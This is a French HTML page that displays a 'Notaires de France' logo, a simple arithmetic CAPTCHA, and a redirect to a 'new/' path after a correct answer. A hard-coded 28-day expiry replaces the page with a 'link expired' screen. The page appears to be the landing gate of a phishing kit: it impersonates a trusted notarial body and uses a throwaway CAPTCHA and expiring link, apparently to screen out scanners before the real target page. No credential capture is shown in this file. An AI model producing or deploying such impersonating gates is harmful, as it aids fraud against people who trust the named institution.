<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Accès sécurisé</title>
  <style>
    body {
      font-family: 'Georgia', serif;
      background-color: #f8f8f8;
      color: #333;
      padding: 40px;
    }
    .captcha-container {
      max-width: 500px;
      margin: auto;
      background: #ffffff;
      border: 1px solid #ccc;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    h2 {
      color: #004080;
    }
    #captcha-canvas {
      margin: 20px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    input[type="number"] {
      width: 100px;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .submit-btn {
      background-color: #004080;
      color: #fff;
      padding: 10px 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    .submit-btn:hover {
      background-color: #003366;
    }
    .error-message {
      color: red;
      display: none;
      margin-top: 10px;
    }
    .success-message {
      color: green;
      display: none;
      margin-top: 10px;
    }
    .logo {
      max-width: 150px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <img src="download.png" alt="Logo Notaires de France" class="logo">
    <h2>Accès sécurisé</h2>
    <canvas id="captcha-canvas" width="250" height="50"></canvas>
    <input type="number" id="captcha-answer" placeholder="Votre réponse">
    <br>
    <button class="submit-btn" onclick="validateCaptcha()">Valider</button>
    <div class="error-message" id="error-message">Réponse incorrecte. Veuillez réessayer.</div>
    <div class="success-message" id="success-message">CAPTCHA résolu avec succès. Redirection en cours...</div>
  </div>

  <script>
    let num1, num2, correctAnswer;

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      correctAnswer = num1 + num2;

      const canvas = document.getElementById('captcha-canvas');
      const ctx = canvas.getContext('2d');

      // Fond
      ctx.fillStyle = '#ffffff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      // Texte
      ctx.font = '20px Georgia';
      ctx.fillStyle = '#004080';
      ctx.fillText(`Combien font ${num1} + ${num2} ?`, 10, 30);

      document.getElementById('captcha-answer').value = '';
      document.getElementById('error-message').style.display = 'none';
      document.getElementById('success-message').style.display = 'none';
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById('captcha-answer').value, 10);
      if (userAnswer === correctAnswer) {
        document.getElementById('error-message').style.display = 'none';
        document.getElementById('success-message').style.display = 'block';
        setTimeout(() => {
          localStorage.setItem("valide", "true");
          window.location.href = 'new/';
        }, 2000);
      } else {
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('success-message').style.display = 'none';
        generateCaptcha();
      }
    }

    // Expiration du lien
    const startDate = new Date('2025-07-03T00:00:00');
    const expirationDays = 28;

    function isLinkExpired() {
      const now = new Date();
      const timeDiff = now - startDate;
      const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
      return daysPassed >= expirationDays;
    }

    function showExpirationMessage() {
      if (isLinkExpired()) {
        document.body.innerHTML = '';
        const messageDiv = document.createElement('div');
        messageDiv.innerHTML = `
          <h1>⚠️ Le lien a expiré</h1>
          <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
        `;
        Object.assign(messageDiv.style, {
          position: 'fixed',
          top: '0',
          left: '0',
          width: '100vw',
          height: '100vh',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          backgroundColor: '#1a1a1a',
          color: '#ff4d4f',
          fontFamily: 'Segoe UI, Arial, sans-serif',
          fontSize: '24px',
          textAlign: 'center',
          padding: '40px',
          boxSizing: 'border-box',
          zIndex: '9999',
        });
        messageDiv.querySelector('h1').style.fontSize = '36px';
        messageDiv.querySelector('h1').style.marginBottom = '20px';
        messageDiv.querySelector('p').style.color = '#ffffff';
        document.body.appendChild(messageDiv);
      }
    }

    window.onload = function() {
      showExpirationMessage();
      generateCaptcha();
    };
  </script>
</body>
</html>
